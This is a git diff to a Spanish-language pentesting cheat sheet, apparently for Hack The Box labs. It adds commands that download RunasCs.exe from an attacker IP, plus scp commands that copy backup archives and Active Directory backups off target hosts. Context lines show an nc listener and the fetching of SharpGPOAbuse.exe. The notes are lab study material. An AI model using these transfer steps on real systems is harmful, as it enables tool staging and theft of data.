@@ -16,8 +16,6 @@ python3 -m venv fs
 source fs/bin/activate
 
 deactivate
-
-source fs/bin/activate
 ```
 
 
@@ -110,8 +108,25 @@ nc -lvnp 4444 > archivo
 Invoke-WebRequest -Uri "http://10.10.14.109:8000/SharpGPOAb use.exe" -OutFile "C:\Temp\SharpGPOAbuse.exe"
 ```
 
+```bash
+powershell -c wget 10.10.14.6/RunasCs.exe -outfile r.exe
+```
 ## Descargar desde ssh
 
 ```bash
 scp -o GSSAPIAuthentication=yes -o GSSAPIKeyExchange=yes f.frizzle@frizzdc.frizz.htb:C:/Users/f.frizzle/Desktop/wapt-backup-sunday.7z .
+```
+
+- O
+```bash
+scp -P 2222 -i id_rsa svc_backup@voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/* .
+```
+
+## AMD64.DEB
+
+```bash
+dpkg -i nats-0.2.4-amd64.deb
+
+#error de dependencias
+sudo apt-get install -f
 ```
